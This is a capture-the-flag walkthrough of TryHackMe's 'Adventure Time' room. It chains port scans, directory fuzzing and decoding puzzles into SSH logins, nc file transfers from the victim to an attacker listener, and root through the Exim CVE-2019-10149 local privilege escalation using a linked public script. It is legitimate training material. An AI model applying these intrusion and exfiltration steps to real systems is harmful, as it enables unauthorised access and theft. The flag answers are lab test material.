# Enumeration

## \[+] 10.10.208.31 - adventure-time.com

Using `echo` and `>>` to append the IP address with the domain name to my `/etc/hosts` file. Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online:

```sh
$ echo '10.10.208.31 adventure-time.com' >> /etc/hosts
$ export RHOSTS=10.10.208.31
$ rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 21 - FTP

From the `nmap` scan results, we can see that the FTP server has anonymous login available which means we can log in without a username or password. There are also six JPEG files which might need steganographic analysis:

```sh
[...]
21/tcp    open  ftp      syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r--    1 ftp      ftp       1401357 Sep 21  2019 1.jpg
| -r--r--r--    1 ftp      ftp        233977 Sep 21  2019 2.jpg
| -r--r--r--    1 ftp      ftp        524615 Sep 21  2019 3.jpg

|_-r--r--r--    1 ftp      ftp         40355 Sep 21  2019 6.jpg
[...]
```

Connect to the FTP server and download all the files using `mget *` and return `a` for all when it asks `anqpy?`:

```sh
ftp anonymous@$RHOSTS
ftp> mget *
mget 1.jpg [anpqy?]? a
```

## \[+] Analyzing the JPG files

Using [exiftool](https://exiftool.org/) to view the EXIF data of all the images shows that each file was created using a different application and there is also some binary in the XP Comment field:

Using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Binary\('Space',8\)\&input=MDExMTEwMDEgMDExMDExMTEgMDExMTAxMDEgMDAxMDAwMDAgMDExMTAwMTAgMDExMDAxMDEgMDExMDAwMDEgMDExMDExMDAgMDExMDExMDAgMDExMTEwMDEgMDAxMDAwMDAgMDExMDExMDAgMDExMDEwMDEgMDExMDEwMTEgMDExMDAxMDEgMDAxMDAwMDAgMDExMTAxMDAgMDExMDExMTEgMDAxMDAwMDAgMDExMTAwMDAgMDExMTAxMDEgMDExMTEwMTAgMDExMTEwMTAgMDExMDExMDAgMDExMDAxMDEgMDAxMDAwMDAgMDExMDAxMDAgMDExMDExMTEgMDExMDExMTAgMDAxMDAxMTEgMDExMTAxMDAgMDAxMDAwMDAgMDExMTEwMDEgMDExMDAwMDE) to decode the binary:
`you really like to puzzle don't ya`

## \[+] Port 443 - HTTPS

From `nmap` scan results, there are two domains shown here - 'adventure-time.com' and 'land-of-ooo.com'. There is also the username 'bubblegum':

```sh
[...]
ssl-cert: Subject: commonName=adventure-time.com/organizationName=Candy Corporate Inc./stateOrProvinceName=Candy Kingdom/countryName=CK/emailAddress=bubblegum@land-of-ooo.com/organizationalUnitName=CC
[...]
```

### \[-] adventure-time.com/index.html

Checking the source code possibly gives a hint to the magic word needed for port 31337:
![f6e0e1aff8af5bdb68ff5ba6966bfba7.png](/resources/b9b0c8322525493c96f8e5f631257a23.png)

The image of the character Finn asks to find Jake:
![7b81f05c9ffe27b1df13f98ba10a4ef5.png](/resources/3a33c59e4bdd4cecbd2733e795715591.png)

Using [feroxbuster](https://github.com/epi052/feroxbuster) to fuzz for directories and files:

```sh
$ feroxbuster -u https://adventure-time.com/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x json,txt,js,xml -s 200,301,302,403 -k -o p-443-adventure-ferox.txt
```

### \[-] adventure-time.com/candybar/

The webpage has another image, this time with the a hint for the magic word encoded in base32:
![7ba47fd5dc2df7ac5e3aa619c14ecc41.png](/resources/8a4f875127994ada84b105a181d45817.png)
*"Jake gave this magic word, so I could always find him........It was something like*

*KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===*

*But I can't pronounce that....what was Jake thinking?!?!?!"*

Decoded with [CyberChef](file:///home/kpgc10/Downloads/CyberChef_v10.4.0/CyberChef_v10.4.0.html#recipe=From_Base32\('A-Z2-7%3D',false\)\&input=S0JRV1k0RE9OQVFIRTUzVU9KNUNBMkxYT1FRRVFTQ0JFQlpISVozSlBCMlhRNFRRTkYyQ0E1TEVNNFFIRVlMS09SVUM0PT09):
`Palpnh rwtrz iwt HHA rtgixuxrpit udg rajth.`

Since this looks like a ROT cipher, I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=ROT13\(true,true,false,11\)\&input=UGFscG5oIHJ3dHJ6IGl3dCBISEEgcnRnaXh1eHJwaXQgdWRnIHJhanRoLg) to brute force the amount needed for decoding. Using ROT13 with the amount set to 11 will decode the message:
`Always check the SSL certificate for clues.`

The same base32 encoded string was commented in the source code:
![c0dba7a84413e9f7e90fb8a92a3e577a.png](/resources/8272e2c23d8144cba33c3c0597590ca8.png)

### \[-] land-of-ooo.com

From the `nmap` scan results, under `ssl-cert` was a domain name of `land-of-ooo.com`. Adding this to `/etc/hosts` file then going to `https://land-of-ooo.com` will show an image of Jake with another clue on how to proceed:
![8056984b071a7b1c15d27af8c455fe72.png](/resources/cdae14ebc023476ba7535815a53b7306.png)

Using `feroxbuster` again to fuzz the URL `https://land-of-ooo.com/` finds the directory `/yellowdog/`:

```sh
$ feroxbuster -u https://land-of-ooo.com/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x json,txt,js,xml -s 200,301,302,403 -k -o p-443-land-of-ooo-ferox.txt

[...]
301      GET        9l       28w      322c https://land-of-ooo.com/yellowdog => http://land-of-ooo.com/yellowdog/
[...]
```

The status code 301 means it's being redirected from `https://land-of-ooo.com/yellowdog` to `http://land-of-ooo.com/yellowdog/` but visting the HTTP version of the website will throw a status code of 404 which means it was not found. Changing the URL to `https://land-of-ooo.com/yellowdog/` will fix this.

### \[-] land-of-ooo.com/yellowdog/

This time, the clue says the Banana Guard is guarding the laptop and he is easily fooled:
![5fd340aca5b3c9723edb9dadfee6a6ce.png](/resources/c536b988471d425f87ac741d9ca97785.png)

Fuzzing URL `https://land-of-ooo.com/yellowdog/` finds the directory `/bananastock/`:

```sh
$ feroxbuster -u https://land-of-ooo.com/yellowdog/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x json,txt,js,xml -s 200,301,302,403 -k -o p-443-land-of-ooo-yellowdog-ferox.txt

[...]
301      GET        9l       28w      334c https://land-of-ooo.com/yellowdog/bananastock => http://land-of-ooo.com/yellowdog/bananastock/
[...]
```

### \[-] land-of-ooo.com/yellowdog/bananastock/

The image is of two Banana Guards discussing the password which is encoded in morse code:
![a986f2a0a4d172206d0e3b1b810f3e77.png](/resources/5dc9e9f7f98b4f2fa48ce02dc747701e.png)

The encoded password is in the source code as well:
![3ace15a586dedadfd935d93e87897feb.png](/resources/abe0c40e85384c8c9f5cb46d612589df.png)

The encoding needs to have the forward and back slashes removed in order to decode it:
`_ .... . _... ._ _. ._ _. ._ ... ._ ._. . _ .... . _... . ... _ _._.__ _._.__ _._.__`

Decoded with [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code\('Space','Line%20feed'\)\&input=XyAuLi4uIC4gXy4uLiAuXyBfLiAuXyBfLiAuXyAuLi4gLl8gLl8uIC4gXyAuLi4uIC4gXy4uLiAuIC4uLiBfIF8uXy5fXyBfLl8uX18gXy5fLl9f) to get the password:
`THE BANANAS ARE THE BEST!!!`

Fuzzing URL `https://land-of-ooo.com/yellowdog/bananastock/` finds the directory `/princess/`

```sh
$ feroxbuster -u https://land-of-ooo.com/yellowdog/bananastock/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x json,txt,js,xml -s 200,301,302,403 -k -o p-443-land-of-ooo-yellowdog-bananastock-ferox.txt

[...]
301      GET        9l       28w      343c https://land-of-ooo.com/yellowdog/bananastock/princess => http://land-of-ooo.com/yellowdog/bananastock/princess/
[...]
```

### \[-] land-of-ooo.com/yellowdog/bananastock/princess/

Here, Princess Bubblegum mentions she is changing usernames and keeping them in a magic safe:
![8f44bdf9e65c6b4b8f635dbeb0611d05.png](/resources/8c0d3a0c13424517ab9a8b8ad80078f9.png)

Checking the source code reveals another ciphertext in the comments. The key, IV and mode of CBC means it was encrypted using AES in Cipher Block Chaning encryption mode:
![60572afffa53f35064b483b3bc5e8035.png](/resources/6dd45c5df4ae4fdabbea4e7bdd54a206.png)

```html
[...]
    <!--
    Secrettext = 0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166
    Key = my cool password
    IV = abcdefghijklmanopqrstuvwxyz
    Mode = CBC
    Input = hex
    Output = raw
    -->
[...]
```

Using `Crypto.Cipher` package from [PyCryptodome](https://www.pycryptodome.org/) and [binascii](https://docs.python.org/3/library/binascii.html) module to create a script for decrypting the ciphertext reveals the password to the application on port 31337. First, the script will decode the hex using `binascii.unhexlify` then decrypt it with the key and IV. The IV only needs to be 16 bytes long, so it's truncated to `abcdefgh`. The resulting plaintext needs to be cleaned up by removing whitespaces and decoded to utf-8 using `decode('utf-8')`.

```python
from Crypto.Cipher import AES
import binascii

# Convert Secrettext from hex to raw format
ciphertext = binascii.unhexlify("0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166")

# Set up the cryptographic algorithm with CBC mode, Key, and truncated IV
key = b'my cool password'
iv = b'abcdefgh'
iv = iv.ljust(16, b'\0')  # Pad the IV to match the required length
cipher = AES.new(key, AES.MODE_CBC, iv)

# Decrypt the ciphertext
plaintext = cipher.decrypt(ciphertext)

# Remove leading/trailing whitespace and decode the plaintext
plaintext = plaintext.strip().decode('utf-8')

# Replace newline characters with spaces
plaintext = plaintext.replace('\n', ' ')

# Remove excessive line breaks
plaintext = ' '.join(plaintext.splitlines())

# Print the decrypted plaintext
print(plaintext)
```

The final result is the password to port 31337:

`the magi J  Ns accessibel at port 31337. the magic word is: ricardio`

## \[+] Port 31337

From `nmap` scan results:

```sh
	31337/tcp open  Elite?   syn-ack
	| fingerprint-strings:
	|   DNSStatusRequestTCP, RPCCheck, SSLSessionReq:
	|     Hello Princess Bubblegum. What is the magic word?
	|     magic word is not
	[...]
```

Connect using [nc](http://www.stearns.org/nc/) then provide the password:

```sh
$ nc $RHOSTS 31337
Hello Princess Bubblegum. What is the magic word?
$ ricardio
The new username is: apple-guards
```

# Initial Foothold & Privilege Escalation

## \[+] Port 22 - SSH

### \[-] apple-guards\@at

Logging in as `apple-guards:THE BANANAS ARE THE BEST!!!` and listing the directory shows there are two flags:
![157e9cbbbdfd9e57490dde284dd0dfe8.png](/resources/5da9b4cea2dc4d2a867fa8d3b7eb0d2e.png)

```sh
$ cat flag1
tryhackme{Th1[...]4rt}
$ cat flag.txt
Good job!!!!
	
	
tryhackme{2e3[...]0ad}
```

`flag1` can be submitted, but `flag.txt` has too many characters, so it might be used for something else later (spoiler: it wasn't).

There is also an e-mail in the file `mbox`. It was sent by `marceline@at` to `apple-guards@at` and mentions there is a file hidden that will get 'apple-guards' more permissions on the machine:

```sh
$ cat mbox

Hi there bananaheads!!!
I heard Princess B revoked your access to the system. Bummer!
But I'll help you guys out.....doesn't cost you a thing.....well almost nothing.
	
I hid a file for you guys. If you get the answer right, you'll get better access.
Good luck!!!!
```

Using the `find` command to look for files owned by 'marceline' gets one result, `/etc/fonts/helper`:

```sh
$ find / -type f -user 'marceline' 2>/dev/null
/etc/fonts/helper
```

Running the binary brings up a prompt for an answer to decode the ciphertext `Gpnhkse`:

```
======================================
      BananaHead Access Pass
       created by Marceline
======================================

Hi there bananaheads!!!
So you found my file?
But it won't help you if you can't answer this question correct.
What? I told you guys I would help and that it wouldn't cost you a thing....
Well I lied hahahaha

Ready for the question?

The key to solve this puzzle is gone
And you need the key to get this readable: Gpnhkse

Did you solve the puzzle?
```

Using the `strings` command on the binary file reveals a bash script:

The bash script `/usr/share/misc/guard.sh` is the code the binary was running:

It shows the password to the puzzle was `Abadeer` and the password to the user 'marceline' is `My friend Finn`

### \[-] marceline\@at

In `/home/marceline` there is another flag and a text file named `I-got-a-secret.txt`:
![15320023ab1a523dd3731872c80301bc.png](/resources/8650fcf9e8a74f0a9eb71c6ef138ad30.png)

```sh
$ cat flag2
tryhackme{N1c[...]0rt}
```

The text file is a note to Finn and another ciphertext at the end of the note:

```sh
$ cat I-got-a-secret.txt
Hello Finn,
	
I heard that you pulled a fast one over the banana guards.
B was very upset hahahahaha.
I also heard you guys are looking for BMO's resetcode.
You guys broke him again with those silly games?
	
You know I like you Finn, but I don't want to anger B too much.
So I will help you a little bit...
	
But you have to solve my little puzzle. Think you're up for it?
Hahahahaha....I know you are.

111111111100100010101011101011111110101111111111011011011011000001101001001011111111111111001010010111100101000000000000101001101111001010010010111111110010100000000000000000000000000000000000000010101111110010101100101000000000000000000000101001101100101001001011111111111111111111001010000000000000000000000000001010111001010000000000000000000000000000000000000000000001010011011001010010010111111111111111111111001010000000000000000000000000000000001010111111001010011011001010010111111111111100101001000000000000101001111110010100110010100100100000000000000000000010101110010100010100000000000000010100000000010101111100101001111001010011001010010000001010010100101011100101001101100101001011100101001010010100110110010101111111111111111111111111111111110010100100100000000000010100010100111110010100000000000000000000000010100111111111111111110010100101111001010000000000000001010
```

The hint for this flag is: *"If stuck do research on cutlery."*

While using various tools to analyze the ciphertext, [dCode.fr](https://www.dcode.fr/en) suggested that the ciphertext was in the Spoon programming language and was able to decode it using the [Spoon interpreter](https://www.dcode.fr/spoon-language):
![b1f50f3b5817fa2f160dddaf16e5dff8.png](/resources/0df443a663374593b4728693d33471e3.png)

Decoded ciphertext:
`The magic word you are looking for is ApplePie`

Using `nc` to connect on port 31337 to enter the magic word `ApplePie` returns the login credentials for user 'peppermint-butler':

```sh
$ nc $RHOSTS 31337
Hello Princess Bubblegum. What is the magic word?
$ ApplePie
The password of peppermint-butler is: That Black Magic
```

### \[-] peppermint-butler\@at

In the home directory for peppermint-butler, there is a flag and a JPG file:
![edc8339727ecf084cced27b949a4e7a4.png](/resources/f3bf426ef2ec4bb099a1d95283c4bb01.png)

```sh
$ cat flag3
tryhackme{N0B[...]3r3}
```

I'll use `nc` to transfer the file onto my machine to analyze the file.

On the attacker machine:

```sh
$ nc -lp 1234 > butler-1.jpg
```

On the victim machine:

```sh
$ nc -w 3 10.13.0.185 1234 < butler-1.jpg
```

In the image, the clue suggests there might be something embedded in the JPG file:
![132a53866a6f7131889779d877512a06.png](/resources/0c940831564c4237885022b0e9fba767.png)

I tried to bruteforce the passphase with the `rockyou.txt` wordlist but it couldn't find a valid passphrase. Going back to the machine I did a search for files owned by the user 'peppermint-butler' and found two interesting files:

```sh
$ find / -type f -user 'peppermint-butler' 2>/dev/null
/usr/share/xml/steg.txt
/etc/php/zip.txt
```

I used `nc` again to transfer them onto my machine for analysis.

```sh
$ cat steg.txt
I need to keep my secrets safe.
There are people in this castle who can't be trusted.
Those banana guards are not the smartest of guards.
And that Marceline is a friend of princess Bubblegum,
but I don't trust her.
	
So I need to keep this safe.
```

The password of my secret file is 'ToKeepASecretSafe'

```sh
$ cat zip.txt
I need to keep my secrets safe.
There are people in this castle who can't be trusted.
Those banana guards are not the smartest of guards.
And that Marceline is a friend of princess Bubblegum,
but I don't trust her.
	
So I need to keep this safe.

The password of my secret file is 'ThisIsReallySave'
```

Using [steghide](https://steghide.sourceforge.net/) with the passphrase `ToKeepASecretSafe` extracted a ZIP file from the `butler-1.jpg` file:

```sh
$ steghide extract -sf butler-1.jpg
Enter passphrase:
wrote extracted data to "secrets.zip".
```

The using `unzip` with the password `ThisIsReallySave` to extract the contents of `secrets.zip`:

```sh
$ unzip secrets.zip
Archive:  secrets.zip
[secrets.zip] secrets.txt password:
 extracting: secrets.txt
```

In the text file, there is a phrase with some missing letters:

```sh
$ cat secrets.txt
[0200 hours][upper stairs]
I was looking for my arch nemesis Peace Master,
but instead I saw that cowering little puppet from the Ice King.....gunter.
What was he up to, I don't know.
But I saw him sneaking in the secret lab of Princess Bubblegum.
To be able to see what he was doing I used my spell 'the evil eye' and saw him.
He was hacking the secret laptop with something small like a duck of rubber.
I had to look closely, but I think I saw him type in something.
It was unclear, but it was something like 'The Ice King s????'.
The last 4 letters where a blur.

Should I tell princess Bubblegum or see how this all plays out?
I don't know.......
```

Taking a guess, the entire phrase was `The Ice King sucks`.

### \[-] gunter\@at

This time there is only a flag in the home directory:
![6d6975accb91291894747ce7b7273bdf.png](/resources/bdef7231af074f29bb81d8452c7e04c9.png)

```sh
$ cat flag4
tryhackme{P1n[...]l3!}
```

Searching for binaries with the [SUID](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit) permissions using `find` results in two files that are not so common to see:

```sh
$ find / -type f -perm /4000 2>/dev/null
/usr/sbin/pppd
/usr/sbin/exim4
```

`/usr/bin/exim4` was the binary user 'gunter' had permissions to access, so I searched for a privilege escalation technique for it. This exploit is [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149) and there is a [Python script by AzizMea](https://github.com/AzizMea/CVE-2019-10149-privilege-escalation) available on GitHub.

The exploit just needs the port that `Exim4` is configured to run on. On the victim machine, the configuration file is located in `/etc/exim4/update-exim4.conf.conf`. After getting the port number, update the exploit's `wizard.py` file on line 5 with the port number 60000. Then transfer `wizard.py` to the victim machine's `/tmp/` folder and run it with `python3 wizard.py`

Checking exim4 configuration file:

```sh
$ cat /etc/exim4/update-exim4.conf.conf
[...]
dc_eximconfig_configtype='local'
dc_other_hostnames='at'
dc_local_interfaces='127.0.0.1.60000'
[...]
```

The exploit created a copy of `/bin/bash` to `/tmp/s` but failed to run the shell afterwards:

```sh
$ python3 wizard.py
220 at ESMTP Exim 4.90_1 Ubuntu Fri, 14 Jul 2023 21:20:28 +0200
	
250 at Hello localhost [127.0.0.1]
	
250 OK
	
250 Accepted
	
354 Enter message, ending with "." on a line by itself
	
b'250 OK id=1qKOL6-0003rH-JF\r\n'
sh: 1: /tmp/s: not found
```

Checking the directory again to see if the shell created with the SUID bit set:
![9669ffe0889b52daed83f5be02bf0cf1.png](/resources/36b15141a31b4b699ff74e1d4b5456b2.png)

Then running the shell with the command `./s` and got a root shell:
![9a1e979ef2f1e420fd4de636f33be111.png](/resources/c6ea975b04cd4a76be9b5d0362f626ec.png)

The final flag was in `/home/bubblegum/Secrets/bmo.txt`:
![c049d975d775546aec313f2e0aa2f6a9.png](/resources/c9c2459f444843b580fdbedb9b6d1df5.png)
